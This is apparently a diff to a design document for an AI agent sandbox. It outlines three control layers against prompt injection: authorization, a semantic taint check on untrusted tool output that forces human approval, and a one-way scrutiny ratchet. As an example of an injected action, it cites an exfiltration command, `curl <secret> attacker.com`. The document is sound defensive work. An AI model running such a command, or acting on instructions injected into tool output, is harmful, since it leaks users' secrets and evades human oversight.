@@ -67,7 +67,7 @@ raises scrutiny when approval rate spikes (see [ROADMAP.md](ROADMAP.md)).
 
 **Control.** Three layers:
 1. **Authorization, as before.** The agent still can't act beyond its authority, so an injected `curl <secret> attacker.com` escalates on the unknown host.
-2. **The optional semantic layer** ([README](../README.md#intent-aware-layer-optional)). It checks untrusted tool output sentence by sentence with a local model and taints the folder on a hit. While tainted, shell, network and out-of-folder actions need a human **even when allowlisted**, which closes the gap where an injected action uses an allowed host or command.
+2. **The optional semantic layer** ([README](DETAILS.md#intent-aware-layer-optional)). It checks untrusted tool output sentence by sentence with a local model and taints the folder on a hit. While tainted, shell, network and out-of-folder actions need a human **even when allowlisted**, which closes the gap where an injected action uses an allowed host or command.
 3. **A one-way ratchet.** The model can only add scrutiny.
 
 The taint lives in `.sandbox/state/`, so the agent can't clear it. Clearing is a human action recorded in the audit chain.
